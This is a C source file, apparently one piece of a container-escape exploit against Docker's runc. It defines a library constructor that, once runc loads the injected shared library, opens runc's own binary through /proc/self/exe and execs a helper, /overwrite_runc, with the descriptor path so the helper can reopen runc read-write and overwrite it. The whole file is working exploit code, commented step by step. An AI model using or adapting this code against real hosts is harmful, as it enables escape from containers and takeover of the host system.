/*
 * attacker/run_at_link.c
 * Injects code into a shared library used by docker's runc
*/

#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define VERBOSE 1

// The shared library that runc links with is rebuilt with with injected code
// on_link() runs when the shared library is loaded by runc with the 
// __attribute__  ((constructor)) gcc syntax.
__attribute__ ((constructor)) 
void on_link()
{
    // open runc binary for reading to get file descriptor for runc to appear
    // under /proc/self/fd/
    // /proc/self/exe points the executable file of the current process
    // since we are current executing as runc, it will open the runc executable
    int readonly_runc_fd = open("/proc/self/exe", O_RDONLY);
    if(readonly_runc_fd == -1)
    {
        perror("[ERR] Cannot open /proc/self/exe aka runc as readonly\n");
        return;
    }
    if(VERBOSE == 1) printf("[OK] opened runc for reading\n");
    
    // determine path of runc file descriptor under /proc/self/fd/
    char runc_fd_path[128]; // allocate a temporary buffer on stack to store fd path
    snprintf(runc_fd_path, 128 * sizeof(char), "/proc/self/fd/%d", readonly_runc_fd);

    // build argv by filling it with arguments to pass overwrite_runc.
    // execve() man page says that argv should contain:
    // argv[0] - the name of the program being execed()
    // argv[1..n-1] - arguments to the pass to the program
    //    -> we will pass the path of the file descriptior that we just opened
    //    readonly under /proc/self/fd/ so that overwrite_runc can reopen it.
    //    This time in read write mode
    // argv[n] - needs to end with a null pointer to signify that argv ended
    char *argv[3]; 
    char *target_program = "/overwrite_runc";

    argv[0] = target_program;
    argv[1] = runc_fd_path;
    argv[2] = NULL; // end of argv

    if(VERBOSE == 1) printf("[+] executing overwrite_runc...\n");
    // last argument is null as we arent passing any evironment variables
    // if evecve() succeeds it does not return and we become overwrite_runc
    int result = execve(target_program, argv, NULL); 
    if(result == -1) perror("[ERR] Cannot exec overwrite_runc\n");
}
